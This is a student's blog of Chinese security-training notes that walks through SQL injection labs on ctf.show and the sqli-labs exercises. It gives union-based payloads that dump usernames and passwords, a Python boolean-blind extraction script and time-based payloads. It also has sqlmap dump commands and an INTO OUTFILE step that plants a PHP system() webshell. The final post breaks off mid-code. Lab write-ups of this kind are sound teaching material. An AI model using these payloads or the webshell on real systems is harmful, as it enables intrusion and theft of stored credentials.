<h2 id="postman软件的使用"><a href="#postman软件的使用" class="headerlink" title="postman软件的使用"></a>postman软件的使用</h2><p>1.在虚拟机win10hei的火狐浏览器访问老师给的ctf show题目链接：<a target="_blank" rel="noopener" href="http://2bedbecd-56d1-426b-a35a-4b49deea4522.challenge.ctf.show/">http://2bedbecd-56d1-426b-a35a-4b49deea4522.challenge.ctf.show/</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703250565862-28b7bbad-59cc-49ef-acbd-724e469485b7.png" alt="image.png"><br>2.键入F12，点击网络，点击重新加载，找到API，即名字为v3.php?page&#x3D;1&amp;limit&#x3D;10的文件，复制右边栏GET请求的网址，粘贴到postman的发包框内<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703248669523-c7c4f1be-66ab-4b58-96d1-46d603fb61d8.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703248850495-d7e11cf9-0571-4085-9798-f28921ab0d03.png" alt="image.png"><br>3.发送请求方式选择GET,在表格第三行输入id和1，点击send,查询到了id&#x3D;1的用户名和密码。然后找闭合点，在1的后面加单引号，再点击send,发现底栏报错，说明1’是闭合点<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703249314650-9f381305-de9f-4f30-a489-2b56eac6392c.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/40675946/1703249614803-476ebe29-f994-4f6a-a167-2303e0b9fdb0.png#averageHue=%23fcfcfc&clientId=u644166bb-afff-4&from=paste&height=371&id=u7bb98b60&originHeight=371&originWidth=904&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22993&status=done&style=none&taskId=u75ea20b7-cc28-4cd3-8b25-a4ec0a20862&title=&width=904" alt="image.png"><br>4.1’的后面加order by 4 – -判断数据表是否有4列，结果报错，改成order by 3 – -，可以显示数据，说明只有3列<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703249919426-3163c3ca-214a-4385-9ba4-d2896a3a1f18.png" alt="image.png"><br>5.查字段名，把1改成-1，在表格1’后面使用union联合sql语句,和之前的报错型的步骤基本相同<br><code>-1&#39; union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#39;ctfshow_user3&#39; and table_schema=database();-- -</code><br>6.查字段，在表格1’后面使用union联合sql语句。<br><code>-1&#39; union select 1,2,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from ctfshow_user3 ;-- -</code><br>因为我们要得到的是username&#x3D;’flag’的密码，所以要删除username,最终为<br><code>-1&#39; union select 1,2,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from ctfshow_user3 ;-- -</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703251101346-9141a6ac-450d-43e9-aab9-c71acea03323.png" alt="image.png"></p>
<h2 id="SQL注入之盲注型，布尔"><a href="#SQL注入之盲注型，布尔" class="headerlink" title="SQL注入之盲注型，布尔"></a>SQL注入之盲注型，布尔</h2><p>1.SQL注入理论<br>（1）SQL注入的含义:SQL注入用户通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过过滤，将恶意SQL语句带入数据库进行执行，通过数据库获取了敏感的信息或者执行了其他恶意操作。<br>（2）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168115226-4b84b8d3-1f5f-4290-a0f9-74e0af769592.png" alt="Image.png"><br>（3）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168181264-adbd4c70-64ff-45ed-89b6-ac32390792f9.png" alt="Image.png"><br>（4）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168241171-bb34d4fe-cb99-49d7-a738-c5c391a116af.png" alt="Image.png"><br>（5）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168291828-ac2d160c-5077-4f3f-8fb8-dc62fda8e7f1.png" alt="Image.png"><br>（6）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168324049-4b6009f0-0bb3-4989-ade2-120b1de01cd6.png" alt="Image.png"><br>2.<code>id=1&#39;and ascii(substring(database(),1,1))=115--+</code>,根据提供的语句，以sqli的第6关为例，编写一个SQL盲注的python脚本并运行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url = &#x27;http://192.168.17.128/sqli/Less-6/?id=1&quot;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def db():</span><br><span class="line">    name = &quot;&quot;</span><br><span class="line">    for i in range(1, 50):</span><br><span class="line">        begin = 32</span><br><span class="line">        end = 128</span><br><span class="line">        tmp = (begin + end) // 2</span><br><span class="line">        while begin &lt; end:</span><br><span class="line">            paramsGet = url + &quot;/**/and/**/ascii(substring((select group_concat(id,username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(</span><br><span class="line">                i, tmp)</span><br><span class="line">            response = session.get(paramsGet)</span><br><span class="line">            if &#x27;You are in...........&#x27; in response.text:</span><br><span class="line">                begin = tmp + 1</span><br><span class="line">                tmp = (begin+end) // 2</span><br><span class="line">            else:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin+end) // 2</span><br><span class="line">        if tmp == 32:</span><br><span class="line">            break</span><br><span class="line">        name += chr(tmp)</span><br><span class="line">        print(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析如下：<br>（1）import requests：导入 requests 模块，用于发送 HTTP 请求。<br>（2）session &#x3D; requests.session()：创建一个 requests 会话（session）对象。<br>（3）url &#x3D; ‘<a target="_blank" rel="noopener" href="http://192.168.17.128/sqli/Less-6/?id=1%22%27%EF%BC%9A%E8%AE%BE%E7%BD%AE%E7%9B%AE%E6%A0%87">http://192.168.17.128/sqli/Less-6/?id=1&quot;&#39;：设置目标</a> URL，其中 id 参数的值为 1”，这里是一个潜在的注入点。<br>（4）利用名为 db 的函数，从数据库中逐个获取字符来构建字符串。代码通过二分法逐个猜测每个字符的 ASCII 值，并通过注入的操作获取其中的数据。<br>3.得到我们想要的字段。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703251885180-214f4be2-1d1f-4ff3-bf33-650e81b2cd4c.png" alt="image.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-培训笔记22" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/12/25/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B022/" class="article-date">
      <time datetime="2023-12-25T01:03:21.000Z" itemprop="datePublished">2023-12-25</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/12/25/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B022/">布尔盲注实例,时间盲注,控制网站,sqlmap工具的使用。</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="一、布尔盲注实例："><a href="#一、布尔盲注实例：" class="headerlink" title="一、布尔盲注实例："></a>一、布尔盲注实例：</h2><p>以ctf_show第四关为例。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703336220310-3b06d9b1-f7d9-45cf-ad4d-2fb84b70ff8c.png" alt="image.png"><br>按下F12，获得一个get请求的api，打开postman。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703336527700-822decb6-3af5-45dd-83a7-500fe0365ecc.png" alt="image.png"><br>能够得到对应的json，说明是一个api。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703336628436-88ce6077-76d9-4f82-9d57-961d52f85995.png" alt="image.png"><br>这里id&#x3D;1’and 1&#x3D;2– -正常回显结果为空，id&#x3D;1’and 1&#x3D;1– -正常回显显示id&#x3D;1的结果。闭合之后再去进行测试，否则就会报错。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703336779190-dd2add20-fded-4eba-a29c-713b0487b5d6.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703336956891-e3a23c56-b453-49aa-9e42-996761ce33b2.png" alt="image.png" style="zoom:50%;" /><br>查询数据库开头第一个字母是不是r。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703337091145-af09b1bf-9ae4-493b-9c01-57adf7aa16d1.png" alt="image.png" style="zoom:50%;" /><br>这里直接用大于，小于进行判断第一个首字母。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703337171574-3d6cb69a-a4ab-47d4-aa8e-f3547d33ceb7.png" alt="image.png"><br>直接换成昨天写好的布尔盲注的脚本，url换成该题目的api。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703337382530-be78a147-5d62-48be-a0cb-ccbd2cd10e4b.png" alt="image.png"><br>因为输入id&#x3D;1结果会出现admin，在if这里可以输入admin。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703337442770-1dde82ed-40c6-44ae-9677-2d8ce28663ef.png" alt="image.png"><br>输出结果正常<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703337567904-eba06dea-13a2-489e-9a61-e1749d43c882.png" alt="image.png"><br>之后就去各个去爆就好了，爆表，爆字段这些：<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703337803267-9b63546b-3658-48aa-9189-de4fa15c67e0.png" alt="image.png"><br>flag结果展示：<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703338043250-a585c80f-9ef0-4f5d-b165-c6f8edee5062.png" alt="image.png"><br>运行与调试<br>可以查看到每一步代码的运行过程。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703338331066-1cf077e6-d634-4d18-9d68-0cb9891fb38e.png" alt="image.png"></p>
<h2 id="二、时间盲注-睡眠盲注-："><a href="#二、时间盲注-睡眠盲注-：" class="headerlink" title="二、时间盲注(睡眠盲注)："></a>二、时间盲注(睡眠盲注)：</h2><p>发现不管输入什么都是直接显示。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703339284198-ed4ba48a-3d65-4cbe-b0cc-392fe6b84ccb.png" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span><span class="string">&#x27;and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- -#三元运算，第一个表示条件，第二个1表示成功的时候，sleep(5)表示失败就休息</span></span><br><span class="line"><span class="string">SELECT BENCHMARK(1000000, SHA1(&#x27;</span>Hello World<span class="string">&#x27;));</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">If</span>(<span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>,<span class="number">1</span>,<span class="title function_ invoke__">BENCHMARK</span>(<span class="number">5000000</span>, <span class="title function_ invoke__">SHA1</span>(<span class="string">&#x27;Hello World&#x27;</span>)))-- -</span><br></pre></td></tr></table></figure>

<p>可以看到当&#x3D;115时马上就显示<br><img src="https://cdn.nlark.com/yuque/0/2023/png/40666686/1703340391273-4889aeb1-96ad-4d10-9579-56a30ca842e4.png#averageHue=%23a06535&clientId=uf5688ffd-8341-4&from=paste&height=767&id=udd28eeed&originHeight=1055&originWidth=1597&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=356293&status=done&style=none&taskId=u85575a95-70c1-4222-92a3-dad2d477a98&title=&width=1161.4545454545455" alt="image.png"><br>可以看到当&#x3D;114时一直处于加载状态，之后才出现结果。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703340416426-3ea97461-54a6-4dad-82e8-d0a528eab24d.png" alt="image.png"><br>直接用时间盲注的脚本。<br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/py/40666686/1703340795579-30954cd2-23f9-4ad7-9ee5-b0955881ea07.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/40666686/1703340795579-30954cd2-23f9-4ad7-9ee5-b0955881ea07.py%22,%22name%22:%22%E6%97%B6%E5%BB%B6%E7%9B%B2%E6%B3%A81.py%22,%22size%22:2046,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u208a619b-6db5-499f-8692-33414b57f10%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22ua29a5379%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">时延盲注1.py</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703340700798-738fe349-b140-4e16-9e99-2117bbd7f5e8.png" alt="image.png"></p>
<h2 id="三、控制网站："><a href="#三、控制网站：" class="headerlink" title="三、控制网站："></a>三、控制网站：</h2><p>?id&#x3D;-1’ union select 1,@@datadir,3– -显示phpstudy的网站根目录。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703341500246-d1f888c3-d9b8-4a76-a49c-8aaea7c9629b.png" alt="image.png"><br>secure_file_priv&#x3D;””将这段代码放入my.ini的[client]的上一行。这个文本的位置在phpstudy的设置中，点击配置文件，mysql.ini。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703341693015-72840272-40f7-411c-abc7-5b0f52356f5f.png" alt="image.png"><br>之后输入这段代码：<br>?id&#x3D;-1’ union select 1,@@datadir,@@secure_file_priv – -，password这里显示为空说明可以注入，在没有这个secure_file_priv&#x3D;””时password显示的是NULL。NULL代表不能在任何地方注入文件。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703341872977-3d8d342a-bbf5-45a7-88e8-75fc610e8aae.png" alt="image.png"><br>?id&#x3D;-1’ union select 1,@@datadir,”<?php ,phpinfo()  ?>“ into outfile “C:\phpstudy_pro\WWW\phpinfo.php” – -<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703343490023-5a004dbb-1deb-4a6f-8bae-3be68f12774a.png" alt="image.png"><br>此时在www的根目录下产生了phpinfo.php。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703342429374-71359c2d-3daf-45e6-b70a-dcc96aff40e3.png" alt="image.png"><br>?id&#x3D;-1’ union select 1,@@datadir,”<?php @system($_GET[a]);  ?>“ into outfile “C:\phpstudy_pro\WWW\tfk.php” – -#在windows中用&#x2F;&#x2F;表示&#x2F;。第一个&#x2F;表示转义符，两个&#x2F;才能表示本身的含义。system表示系统命令执行函数，这个函数通过get参数进行执行，创造了一个webshell后台。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703342328099-4e9cee26-7456-432c-9893-cfb08f1cc290.png"><br>打开网站输入?a&#x3D;dir<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703343632508-e42536c9-b428-4a38-8f7d-85936e9eefbf.png" alt="image.png"><br>打开网站输入?a&#x3D;whoami<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703343789595-202e1326-e6fd-48e4-b0fb-3ba356e65b71.png" alt="image.png"><br>打开网站输入?a&#x3D;systeminfo输出系统的基本信息<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703343915907-1d88aa82-691c-4cb1-b29e-86221a30ffcd.png" alt="image.png"></p>
<h2 id="四、sqlmap的使用："><a href="#四、sqlmap的使用：" class="headerlink" title="四、sqlmap的使用："></a>四、sqlmap的使用：</h2><h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><p>1.下载sqlmap的压缩包，附件如下<br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/zip/40675946/1703343149028-fd98a004-40af-43ea-8d01-d839d12e226e.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/zip/40675946/1703343149028-fd98a004-40af-43ea-8d01-d839d12e226e.zip%22,%22name%22:%22sqlmap-1.7.zip%22,%22size%22:7517702,%22ext%22:%22zip%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u7f82c97a-84fe-4940-8dea-2928843d8c0%22,%22taskType%22:%22upload%22,%22type%22:%22application/x-zip-compressed%22,%22__spacing%22:%22both%22,%22id%22:%22ua927c838%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">sqlmap-1.7.zip</a><br>2.在解压缩后的sqlmap文件夹的路径下输入cmd,进入命令行模式。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703343789845-e2bc6636-8695-4887-828a-48edecba3c0e.png" alt="image.png"><br>3.输入<code>sqlmap -h</code>可以查看sqlmap的帮助信息和参数列表，以便正确使用该工具执行各种SQL注入测试和攻击。<br>4.因为主机上执行sqlmap命令时产生了奇怪的报错，转用虚拟机。以sqli的第一关为例，保证虚拟机win10hei和kali都是桥接模式，保证他俩的IP地址在同一网段。在kali的命令行输入爆库命令<code> sqlmap  -u &quot;[http://192.168.2.118/sqli/Less-1/?id=1&quot;](http://192.168.2.70/sqli/Less-1/?id=1&quot;) --dbs</code>，得到库名。注意192.168.2.118是win10hei的IP地址。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703345566426-f9bc4e34-2be5-4552-aeb8-915d7a55f9ee.png" alt="image.png"><br>5.输入爆表命令：<code>sqlmap  -u &quot;[http://192.168.2.118/sqli/Less-1/?id=1&quot;](http://192.168.2.70/sqli/Less-1/?id=1&quot;)  --batch -D security --tables</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703345836431-388137f0-bf58-4684-a28a-c2309816ae94.png" alt="image.png"><br>6.输入爆字段名命令<code>sqlmap  -u &quot;[http://192.168.2.118/sqli/Less-1/?id=1&quot;](http://192.168.2.70/sqli/Less-1/?id=1&quot;)   --batch -D security -T users --columns</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703345978463-5dfb765f-f135-4f62-83b6-b35e90a638a6.png" alt="image.png"><br>7.输入爆字段命令<code>sqlmap  -u &quot;[http://192.168.2.118/sqli/Less-1/?id=1&quot;](http://192.168.2.70/sqli/Less-1/?id=1&quot;)    --batch -D security -T users -C &quot;id,username&quot; --dump</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703346083484-54bf6d01-2b2a-400e-a58f-27c6a05420e1.png" alt="image.png">post请求：<br>以第11关为例：<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703347187990-4fe88393-9217-424c-abd5-b8ca5c7f75b0.png" alt="image.png"><br>打开yakit免配置启动。<br>输入虚拟机的ip地址进入第11关。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703347331454-18708817-f96b-46b7-a1dc-8de87609a6bd.png" alt="image.png"><br>用yakit进行抓包发送到web fuzzer<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703347434256-fc9fa70d-f5c5-4769-9c49-bc780f5c420a.png" alt="image.png"><br>将1.txt保存下来存在sqlmap的上一级目录中<br>输入命令：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r <span class="string">&quot;../1.txt&quot;</span>  --dbs --batch</span><br><span class="line">增加等级与风险：  python sqlmap.py -r <span class="string">&quot;../1.txt&quot;</span>  --dbs --batch --level=<span class="number">5</span> --risk=<span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>此时爆出数据库。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703348000344-f1b633df-d235-48ea-aa19-c5b37be8ef63.png" alt="image.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-培训笔记20" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B020/" class="article-date">
      <time datetime="2023-12-23T14:35:16.000Z" itemprop="datePublished">2023-12-23</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B020/">SQL注入之联合型</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="安装PHP5-5-9，HackBar"><a href="#安装PHP5-5-9，HackBar" class="headerlink" title="安装PHP5.5.9，HackBar"></a>安装PHP5.5.9，HackBar</h2><p>1.打开虚拟机win10hei的PHPstudy，启动Apache和Mtsql，在软件管理的php界面下载php5.5.9，<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080258406-5071209f-9911-44bc-92f1-a2ae9d2f78ae.png" alt="image.png"><br>2.在下图的路径输入cmd,在输入以下命令：</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080376428-d760af2c-e3e8-4399-b3cc-c4642397f8df.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql  -u root -p</span><br><span class="line">show databases；</span><br><span class="line">use security;</span><br><span class="line">show tables;</span><br><span class="line">select 1，2,3;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080560321-32f26f0e-eb22-4eeb-92c0-9eb1a542ffb0.png" alt="Image.png"><br>3.下载火狐插件HackBar 它可以发包。把这个插件安装到浏览器。按键盘上的F12可以唤起它。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080753625-31554e52-90d8-4f13-b926-3d65803c9cff.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080802345-7bdec522-fae3-4bc3-a3c7-47975aa00522.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080911381-9f3e0491-4687-4014-9a3e-7ff1e1eb5b26.png" alt="image.png"><br>4.information_schema是在mysql5.0之后产生的（面试题考点）</p>
<h2 id="SQL联合注入步骤"><a href="#SQL联合注入步骤" class="headerlink" title="SQL联合注入步骤"></a>SQL联合注入步骤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">联合(union)的顺序:查表-&gt;查字段名-&gt;查字段</span><br><span class="line"></span><br><span class="line">SQL查表</span><br><span class="line">select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database();-- -</span><br><span class="line"></span><br><span class="line">SQL查字段名</span><br><span class="line">select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();-- -</span><br><span class="line"></span><br><span class="line">SQL查字段</span><br><span class="line">select group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from users ;-- -     //这三条语句必记</span><br></pre></td></tr></table></figure>

<p>1.把sqli文件复制到phpstudy的根目录下，使用php5.5.9，打开网站，点击sqli，进入第一关<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703081834980-d182d068-33e3-4409-a6a4-66d6b1d7520b.png" alt="image.png"><br>2.格式：本地地址或虚拟机地址&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;x   union      xxxxxxxxxxxxxxxx    – -<br>注意：x的值为-1或0         – -为SQL的注释<br>3.先判断是否闭合，输入？id&#x3D;1  再点击Excute发包。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703082782269-f4f9e588-7de0-4728-8678-0edc126360bd.png" alt="image.png"><br>4.然后在1后面加 ‘ 发现报错，如图，有5个分号，1和5抵消，2和3抵消，剩下4，说明没有闭合，1’就是我们要找的。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703083424177-f813c2f6-07c8-4ed9-8aa3-eb163abd70ff.png" alt="image.png"><br>5.其次，开始查表，把1改成0，在0’后面加一个空格，然后加union ，在union后面加查表语句  select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema&#x3D;database();  这条语句后要加 – -   将后面的内容注释掉。<br>最终语句为<br><code>[http://localhost/sqli/Less-1/?id=0&#39;](http://localhost/sqli/Less-1/?id=0&#39;)  union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database();-- -</code></p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703084084617-c5a5e408-80ed-4633-8657-172464224c47.png" alt="image.png"><br>6.查字段名，把原来语句的基础上，把查表语句改成查字段语句，然后加上– -<br><code>[http://localhost/sqli/Less-1/?id=0&#39;](http://localhost/sqli/Less-1/?id=0&#39;)  union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#39;users&#39; and table_schema=database();-- -</code></p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703084568983-25426fef-0ad4-4668-92fe-01c31deb7031.png" alt="image.png"><br>7.最后查字段，把原来语句的基础上，把查字段名语句改成查字段语句，在 group_concat(id,”<del>“,username,”</del>“,password)的group前加上     1，      在password）后面加    ,3       最后再完整语句后加上– -<br><code>[http://localhost/sqli/Less-1/?id=0&#39;](http://localhost/sqli/Less-1/?id=0&#39;)  union select 1, group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password),3 from users ;-- -</code></p>
<p>8.最终得到我们想要的整列的username和整列的password<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703085525578-5bf71d67-d324-4a38-bec1-a63cdfd5bcc0.png" alt="Image.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-培训笔记19" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B019/" class="article-date">
      <time datetime="2023-12-23T14:29:31.000Z" itemprop="datePublished">2023-12-23</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B019/">axios和api.php的使用</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="axios的使用"><a href="#axios的使用" class="headerlink" title="axios的使用"></a>axios的使用</h2><p>1.在vscode创建index.php，导入index.js，vue.js，index.js，axios.min.js四个包<br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/zip/40675946/1702896649350-83e99bd5-f450-45df-b6bd-191782c72372.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/zip/40675946/1702896649350-83e99bd5-f450-45df-b6bd-191782c72372.zip%22,%22name%22:%22html%E4%BD%BF%E7%94%A8vue%E6%9D%90%E6%96%99%E5%8C%85.zip%22,%22size%22:396254,%22ext%22:%22zip%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u83b244ba-1d15-4404-ac0b-95d567d07c7%22,%22taskType%22:%22upload%22,%22type%22:%22application/x-zip-compressed%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22ue688691f%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">html使用vue材料包.zip</a><br>2.（1）编写index.php，写入以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 